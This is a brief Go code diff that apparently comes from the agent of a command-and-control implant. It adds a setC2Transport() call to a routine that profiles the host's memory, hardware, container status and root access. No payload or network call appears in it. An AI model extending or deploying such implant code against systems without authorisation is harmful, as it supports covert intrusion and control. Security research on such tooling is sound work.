@@ -94,6 +94,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
 	info.Hardware = util.CheckProduct()
 	info.Container = CheckContainer()
+	setC2Transport()
 	info.Transport = emp3r0r_data.Transport
 
 	// have root?
